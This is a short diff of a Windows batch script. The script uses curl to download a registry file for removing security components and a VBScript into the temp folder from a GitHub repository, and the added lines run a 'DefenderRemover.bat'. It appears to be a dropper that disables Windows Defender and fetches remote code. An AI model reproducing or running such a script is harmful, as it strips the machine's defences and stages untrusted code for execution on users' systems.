@@ -26,6 +26,8 @@ curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Remove
 cd ..
 cd Remove_SecurityComp
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Remove_SecurityComp.reg -o Remove_SecurityComp.reg
+cd ..
+DefenderRemover.bat
 
 cd %temp%
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
